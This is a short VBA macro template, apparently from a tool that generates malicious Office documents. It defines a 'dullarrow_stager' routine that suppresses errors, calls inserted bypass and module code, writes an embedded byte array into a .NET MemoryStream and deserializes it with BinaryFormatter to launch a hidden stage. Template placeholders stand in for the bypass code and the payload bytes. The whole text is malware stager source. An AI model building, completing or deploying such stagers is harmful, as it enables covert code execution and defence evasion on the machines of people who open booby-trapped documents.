{{bypassCode}}

{{moduleCode}}

Sub dullarrow_stager()
    
    Dim lpStage_1() As Byte
    
    Dim objBinaryFormatter As Object
    Dim objMemoryStream_1 As Object
    Dim objDeserialize_1 As Object
    
    Dim i

    On Error Resume Next

    {{bypassCalls}}
    
    {{moduleCalls}}
    
    Set objMemoryStream_1 = CreateObject("System.IO.MemoryStream")
    Set objBinaryFormatter = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")

    lpStage_1 = getStage_1()

    For Each i In lpStage_1
		objMemoryStream_1.WriteByte i
    Next i

    objMemoryStream_1.Position = 0

    Set objDeserialize_1 = objBinaryFormatter.Deserialize_2(objMemoryStream_1)

End Sub

{{getStage_1}}

